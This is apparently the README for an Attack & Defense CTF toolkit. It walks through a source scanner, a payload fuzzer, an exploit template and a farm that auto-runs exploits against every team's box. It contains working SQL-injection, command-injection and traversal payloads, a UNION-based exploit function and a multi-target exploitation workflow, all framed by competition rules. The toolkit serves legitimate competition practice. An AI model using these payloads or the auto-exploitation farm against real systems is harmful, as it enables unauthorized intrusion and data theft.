# RE:HACK A&D Toolkit — Full Guide

Toolkit for Attack & Defense CTF. All tools use **no AI** — just pattern-matching,
a big payload library, and automation. Written so a total beginner can use it.

---

## FILE LIST

| File | What it does | When to use |
|---|---|---|
| `toolbox.py` | Error-handling backbone (all tools import it) | Never run directly — must sit in the same folder |
| `payloads.py` | Library of 1197 payloads (SQLi, cmdi, SSTI, etc.) | Never run directly — omniprobe imports it |
| `triage.py` | Scan source code for bug patterns | When organisers give you service source code |
| `omniprobe.py` | Fire all payloads at a web service | When you want to find vulnerabilities in an HTTP service |
| `exp_template.py` | Template for writing exploits | When you found a bug and want to write the exploit |
| `farm.py` | Auto-run exploits against all teams every tick | When your exploit works and you want auto-flags |
| `webprobe.py` | Simpler older version of omniprobe | Optional — omniprobe is better |

**REQUIRED**: `toolbox.py` and `payloads.py` must be in the same folder as the other tools.

---

## BEFORE STARTING — SYSTEM CHECK

Run this to make sure everything works:

```
python -c "import payloads"
```

Expected output:
```
(nothing — it just returns to the prompt)
```

If you get `ModuleNotFoundError`, you are running from the wrong folder.
`cd` into this folder first.

All tools use only Python standard library — **no `pip install` needed.**

---

## TOOL 1: triage.py — SCAN SOURCE CODE FOR BUGS

### What is it for?
The organisers give you the source code of a service (a folder with `.py`, `.php`,
`.js`, `.java`, `.c` files). This tool scans every file and shows you the lines that
probably contain bugs.

### Basic command
```
python triage.py <source_folder>
```

### Example
```
python triage.py C:\services\bigbearcrafty
```
or on Pwnbox (Linux):
```
python3 triage.py ~/services/bigbearcrafty
```

### Expected output
```
[HIGH] SQL injection     views.py:42
       query = f"SELECT * FROM users WHERE name='{name}'"
[HIGH] command injection utils.py:88
       subprocess.call("convert " + filename, shell=True)
[MED ] path traversal    files.py:15
       open(dir + name)
[LOW ] hardcoded secret  config.py:3
       password = "admin123"

[*] 5 findings. HIGH first — confirm each against the actual data flow before trusting it.
```

### How to read the output
- **HIGH** = most likely a real bug — check these first
- **MED** = maybe a bug, need to look at the context
- **LOW** = useful info (hardcoded passwords, debug mode)
- The number after the file name is the **line number** — open that file at that line

### If you get an error
```
[ERROR] usage: source directory not found: NOSUCHDIR
  fix: pass the vulnbox source folder, e.g. python triage.py ~/services/bigbear
```
This means: the folder you gave does not exist. Check the spelling of the path.

---

## TOOL 2: omniprobe.py — FIRE ALL PAYLOADS (MAIN TOOL)

### What is it for?
When you have a web service (HTTP), this tool sends 1197 payloads one by one
(with a 2-second delay per the organiser rules) and marks the ones that work.

### Basic command
```
python omniprobe.py <service_url> --data "param1=value1&param2=value2"
```

### Example 1: a normal login service
```
python omniprobe.py http://10.10.1.1:8080/login --data "user=admin&pass=test123"
```

### Expected output
```
[*] baseline (3 samples, measuring stability)...
[*] baseline: 200 sizes=[5120, 5120, 5120] variance=0B stable=True
[*] params: ['user', 'pass'] | classes: ['sqli', 'nosql', ...]
[*] 2.0s delay (org rule). est: 45.2 min

[--] sqli on user
  [sqli     ] user=    "' OR '1'='1"                          -> 200 5120B  2.1s
  [sqli     ] user=    "' OR 1=1--"                           -> 200 5120B  2.0s
[--] sqli on pass
  [sqli     ] pass=    "' OR '1'='1"                          -> 200 8401B  2.1s *** login response
           verifying... CONFIRMED (reproduced 2/2) ***
  [cmdi     ] pass=    "; cat /flag*"                         -> 200 89B    2.0s *** COMMAND OUTPUT VISIBLE
           verifying... CONFIRMED (reproduced 2/2) ***
...
[*] done. 2 high-confidence (***-marked) hits found.
[*] every *** hit: reproduce by hand, understand it, then write exp_template.py exploit.
```

### How to read the output — MOST IMPORTANT PART
| Symbol | Meaning | Action |
|---|---|---|
| `***` + `CONFIRMED` | Almost certainly a real bug — reproduced 2 times | Act on it: write the exploit |
| `***` + `NOT reproducible` | False positive — discard | Skip |
| `**` | Suspicious — needs manual look | Check only if no `***` found |
| (nothing) | Payload had no effect | Skip |

### All options

| Option | What it does | Example |
|---|---|---|
| `--data` | Form params to fuzz | `--data "user=a&pass=b"` |
| `--param` | Fuzz only one param (faster) | `--param pass` |
| `--classes` | Pick only some attack types (MUCH faster) | `--classes sqli,cmdi` |
| `--cookie` | Session cookie (when login is needed first) | `--cookie "SESSION=abc123"` |
| `--header` | Extra header | `--header "X-Api-Key: xyz"` |
| `--token` | JWT token (for jwt/claim classes) | `--token "eyJhbG..."` |
| `--origin` | Origin header (for cors class) | `--origin http://evil.com` |
| `--targets` | File with a list of URLs (multi-target) | `--targets targets.txt` |

### Full list of `--classes`

| Class | What it attacks | Payloads |
|---|---|---|
| `sqli` | SQL injection (login bypass, UNION, time-based) | 142 |
| `cmdi` | Command injection (`; cat /flag`) | 109 |
| `traversal` | LFI / read files (`../../../flag`) | 85 |
| `logic` | Type juggling / auth bypass (`0e0`, `true`) | 66 |
| `ssti` | Template injection (`{{7*7}}`) | 52 |
| `ssrf` | Make the server fetch other URLs | 40 |
| `xss` | Reflected XSS | 39 |
| `nosql` | MongoDB injection (`$ne`) | 43 |
| `xpath` | XPath injection (XML services) | 30 |
| `log4shell` | Log4j JNDI (`${jndi:ldap://...}`) | 29 |
| `deser` | Deserialization (pickle, PHP, Java) | 28 |
| `idor` | Change object IDs (1, 2, 0, -1) | 36 |
| `fmt` | Format string (`%p`, `{0.__class__}`) | 36 |
| `redirect` | Open redirect | 18 |
| `ldap` | LDAP filter injection | 18 |
| `graphql` | GraphQL introspection/field probing | 19 |
| `xxe` | XML external entity (read files) | 11 |
| `crlf` | Header injection (`%0d%0aSet-Cookie:`) | 11 |
| `hpp` | Parameter pollution | 14 |
| `xslti` | XSLT injection | 6 |
| `cors` | CORS misconfiguration | 7 |
| `cloud` | Cloud metadata (AWS/GCP/Azure) | 18 |
| `rfi` | Remote file inclusion | 20 |
| `errdisc` | Error disclosure scan (stack trace leaks) | 1 probe |
| `jwt` | JWT alg:none forgery — **needs `--token`** | 17 |
| `claim` | JWT claim flipping — **needs `--token`** | 27×6 |
| `race` | Race condition (20 parallel requests) | 12 |
| `pathbypass` | Route bypass (`/admin..;/`, `/actuator/env`) | 61 |
| `dbprobe` | Raw Redis/Memcached/Mongo probing | 62 |

### Useful ready-made commands (copy-paste)

**Quick 5-minute check — routes + flag files only:**
```
python omniprobe.py http://10.10.1.1:8080 --classes pathbypass
```

**Login form — SQLi only (4 minutes):**
```
python omniprobe.py http://10.10.1.1:8080/login --data "user=admin&pass=x" --classes sqli,logic
```

**Error disclosure scan first (30 seconds — always do this FIRST):**
```
python omniprobe.py http://10.10.1.1:8080/login --data "user=a&pass=b" --classes errdisc
```

**With a session cookie (already logged in):**
```
python omniprobe.py http://10.10.1.1:8080/profile --data "name=x" --cookie "SESSION=abc123"
```

**With a JWT token from the login:**
```
python omniprobe.py http://10.10.1.1:8080/api/profile --classes jwt,claim --token "eyJhbGciOiJIUzI1NiIs..."
```

**Multi-target (all teams, same service):**
```
python omniprobe.py --targets targets.txt --data "user=admin&pass=x" --classes sqli
```

Contents of `targets.txt` (one URL per line):
```
http://10.10.1.1:8080/login
http://10.10.2.1:8080/login
http://10.10.3.1:8080/login
```

### How long does a run take?
| Setup | Estimated time |
|---|---|
| 1 param, 1 small class (errdisc) | <1 minute |
| 1 param, `--classes sqli` | ~5 minutes |
| 1 param, all classes | ~30 minutes |
| 2 params, all classes | ~60 minutes |

**IMPORTANT TIP**: Do not run all classes on all params blindly. Use `triage.py` or
Tulip first to know what is suspicious, then fire only that class.

### If you get an error
```
[ERROR] usage: URL missing scheme: 'notaurl'
  fix: use http://ip:port or https://ip:port
```
→ The URL must start with `http://` or `https://`.

```
[ERROR] unexpected: ...
  fix: check logs\omniprobe-20261117-031526.log for full traceback
```
→ Open that log file in the `logs/` folder to see the full error.

---

## TOOL 3: exp_template.py — WRITE AN EXPLOIT

### What is it for?
When you found a `***` bug in omniprobe, copy this file as your new exploit.

### Step by step

**Step 1 — copy the template:**
```
copy exp_template.py exploits\bigbearcrafty_sqli.py
```
(Linux: `cp exp_template.py exploits/bigbearcrafty_sqli.py`)

**Step 2 — edit the `get_flag_from_service` function:**

Open the file, find that function, replace the logic with your real exploit.
Example for the SQLi found earlier:

```python
def get_flag_from_service(host, port, extra):
    import urllib.request, urllib.parse
    data = urllib.parse.urlencode({
        "name": "' UNION SELECT NULL,flag,NULL,NULL FROM flags--",
        "pass": "x"
    }).encode()
    req = urllib.request.Request(f"http://{host}:{port}/login", data=data)
    return urllib.request.urlopen(req, timeout=6).read()
```

**Step 3 — test against ONE box:**
```
python exploits\bigbearcrafty_sqli.py 10.10.1.1 8080
```

### Expected output (success)
```
REHACK{abc123def456}
```
The flag prints to stdout — that is all. The farm reads it from here.

### Expected output (failure)
```
exploit failed: target=10.10.1.1:8080 cause=ConnectionRefusedError: ...
  hint: service down, patched, or protocol changed — check in Tulip
```
or
```
no flag pattern in 5120B response — FLAG_RE may not match comp format
  first bytes: b'<html><body>Welcome...'
```
This means the service is alive but no flag was found in the response — change the
exploit query, or fix `FLAG_RE` at the top of the file so it matches your comp's
flag format.

### Exploit rules (MUST follow so the farm works)
1. **Print flags to stdout only** — one flag per line
2. **Debug messages to stderr only** (`file=sys.stderr`)
3. **Always set a timeout** on every connection — a hanging exploit will block
   a farm worker for the whole tick
4. `FLAG_RE` at the top of the file — change it once to match your comp's flag format

---

## TOOL 4: farm.py — AUTO-FLAG ALL TEAMS

### What is it for?
When your exploit works on one box, the farm runs it against ALL teams every tick,
collects flags, and submits them to the gameserver. Fully automatic until the comp ends.

### Setup

**Step 1 — make sure the `exploits/` folder exists and has exploits:**
```
dir exploits
```

**Step 2 — set environment variables (Windows cmd):**
```
set API_URL=http://GAMESERVER_IP:PORT
set TEAM_HOSTS=10.10.1.1,10.10.2.1,10.10.3.1,10.10.4.1,10.10.5.1
set TICK_SECONDS=60
```
(Linux: use `export` instead of `set`)

**Step 3 — run it:**
```
python farm.py
```

### Expected output
```
[*] farm up. api=http://gameserver:8080 tick=60s dir=exploits
[*] tick: 2 exploits x 5 targets
[flag] REHACK{abc123def456}
[flag] REHACK{xyz789ghi012}
[INFO] submitted 2 flags: b'{"status": "ok"}'
[*] tick: 2 exploits x 5 targets
...
```

Leave it running. It repeats every tick forever. Press `Ctrl+C` to stop.

### All environment variables

| Variable | Default | What it does |
|---|---|---|
| `API_URL` | `http://127.0.0.1:8080` | Gameserver URL (ructf protocol) |
| `TEAM_HOSTS` | (empty) | Comma-separated team IPs — fallback if attack-info fails |
| `TICK_SECONDS` | `60` | Length of one tick |
| `EXPLOIT_DIR` | `exploits` | Exploit folder |
| `EXPLOIT_DELAY` | `2.0` | Delay between requests (NEVER go below 2 — organiser rule) |
| `EXPLOIT_TIMEOUT` | `30` | How long one exploit may run before being killed |

### If you get an error
```
[WARN ] attack-info unreachable: ... falling back to TEAM_HOSTS
[ERROR] target: no attack-info and TEAM_HOSTS empty
  fix: export TEAM_HOSTS=ip1,ip2,... or fix API_URL
```
→ Set `TEAM_HOSTS` or fix `API_URL`.

```
[WARN ] exploit timed out after 30s: exploits/x.py -> 10.10.2.1
```
→ An exploit hung on that team — their service probably crashed or is patched.
Ignore it, the farm keeps going.

### IMPORTANT protocol note
The farm defaults to the **ructf protocol** (`GET /attack.json`, `PUT /flags`).
If the RE:HACK gameserver uses a different protocol (faust, custom), the
`get_targets()` and `submit_flags()` functions in `farm.py` must be adjusted.
**Test the farm with the real gameserver before competition day.**

---

## TOOL 5: webprobe.py (optional, simpler version of omniprobe)

```
python webprobe.py http://10.10.1.1:8080/login --data "user=a&pass=b"
```
Same idea as omniprobe but with fewer payloads and no auto-verify.
Use omniprobe as your default; webprobe is only for quick checks.

---

## FULL WORKFLOW DURING THE COMP (PRINT THIS PART)

```
┌─────────────────────────────────────────────────────────┐
│  NEW SERVICE DROPS                                      │
└──────────────────┬──────────────────────────────────────┘
                   │
                   ▼
     1. python triage.py <source_dir>          (2 minutes)
        → find the HIGH findings
                   │
                   ▼
     2. python omniprobe.py <url> --classes errdisc   (30 seconds)
        → stack trace leak? then everything is easier
                   │
                   ▼
     3. python omniprobe.py <url> --classes <relevant>  (2-5 minutes)
        → find a *** CONFIRMED
                   │
                   ▼
     4. copy exp_template.py → edit → test on one box  (10 minutes)
        → flag comes out
                   │
                   ▼
     5. drop it in exploits/ → farm.py auto-flags all teams
        → MOVE TO THE NEXT SERVICE, the farm works on its own
```

### Team role split (3 players)
| Player | Job |
|---|---|
| Player 1 | Analysis: triage + omniprobe + writing exploits |
| Player 2 | Defence: Tulip monitoring, patching own services, keeping SLA |
| Player 3 | Stealing other teams' exploits via Tulip + keeping the farm alive |

---

## TULIP — HOW IT FITS WITH THIS TOOLKIT

Tulip (running at `192.168.0.102:3000`) shows the traffic hitting your box.
The combined flow:

1. Tulip shows another team attacking you → you see their payload
2. That payload tells you which `--classes` to fire with omniprobe
3. Or just write the exploit directly from their payload — no probing needed
4. Patch your own box against the same attack

---

## ORGANISER RULES THIS TOOLKIT FOLLOWS

- ✅ Minimum 2-second delay between every automated request (`EXPLOIT_DELAY`, `DELAY`)
- ✅ No port scanning — uses only the service list the organisers provide
- ✅ Low concurrency (3 workers) — no flooding
- ✅ All activity through the Pwnbox — copy this folder into the Pwnbox

**DO NOT do these** (you will be disqualified):
- ❌ Run scans against organiser infrastructure or other teams' infra
- ❌ Lower the delay below 2 seconds
- ❌ DDoS / fork bombs / resource exhaustion
- ❌ Change firewall rules to block other teams

---

## TROUBLESHOOTING — COMMON PROBLEMS

### `ModuleNotFoundError: No module named 'toolbox'`
You are running from the wrong folder. `cd` into the toolkit folder first.

### omniprobe says `UNSTABLE BASELINE`
The target page changes between requests (timestamps/CSRF). Delta-based results
will be noisy — trust only `*** CONFIRMED`, and rely more on time-based payloads
(`sqli` with SLEEP payloads).

### All responses are `-1`
The service is unreachable — wrong IP/port, or the service is down. Check the
organiser's list.

### Farm runs but no flags
1. Test the exploit manually: `python exploits/x.py 10.10.1.1 8080` — does a flag come out?
2. If yes → submission problem — check `API_URL` and the gameserver protocol
3. If no → the service got patched, write a new exploit

### Exploit works manually but not in the farm
Make sure the exploit prints the flag to **stdout** (not stderr, no other debug prints).
The farm reads stdout only, using the `FLAG_RE` regex.

### Where are the log files?
In the `logs/` folder, in the same directory. One file per run, with a timestamp in
the name. A SUMMARY line at the end of every log:
```
SUMMARY tool=omniprobe duration=240.1s info=1187 warn=3 error=0 hits=2
```

### Exit codes (for other scripts to read)
| Code | Meaning |
|---|---|
| 0 | Success |
| 1 | Unknown error |
| 2 | Wrong usage |
| 3 | Target problem (service down, gameserver unreachable) |
| 4 | Environment problem (missing file, bad env var) |
| 130 | Cancelled with Ctrl+C |

---

## BEFORE COMPETITION DAY — CHECKLIST

- [ ] Copy this whole folder into the Pwnbox (all files including `toolbox.py`, `payloads.py`)
- [ ] Run `python -c "import payloads"` in the Pwnbox — confirm no error
- [ ] Know the comp's flag format (e.g. `REHACK{...}`) — update `FLAG_RE` in
      `exp_template.py` and `farm.py` if different
- [ ] Know the gameserver protocol — test `farm.py` against the real gameserver
- [ ] Print the bug-pattern cheat sheet — bring it on paper
- [ ] Practise once: run `triage.py` + `omniprobe.py --classes errdisc,sqli` against
      any practice web app so you have seen live `***` output before the real thing

---

## ONE-PAGE SUMMARY

```bash
# 1. scan source
python triage.py <folder>

# 2. probe the service (start with the fast ones)
python omniprobe.py http://IP:PORT/path --data "a=b" --classes errdisc
python omniprobe.py http://IP:PORT/path --data "a=b" --classes sqli,cmdi,traversal
python omniprobe.py http://IP:PORT/path --data "a=b" --classes pathbypass

# 3. write an exploit
cp exp_template.py exploits/<service_name>.py
# edit get_flag_from_service(), then test:
python exploits/<service_name>.py <ip> <port>

# 4. auto-flag all teams
set API_URL=http://<gameserver>
set TEAM_HOSTS=<ip1>,<ip2>,...
python farm.py

# if you have a JWT
python omniprobe.py http://IP:PORT/api/x --classes jwt,claim --token "eyJ..."

# multi target
python omniprobe.py --targets targets.txt --data "a=b" --classes sqli
```

Only trust output marked `*** CONFIRMED`. Everything else is a hint, not a result.
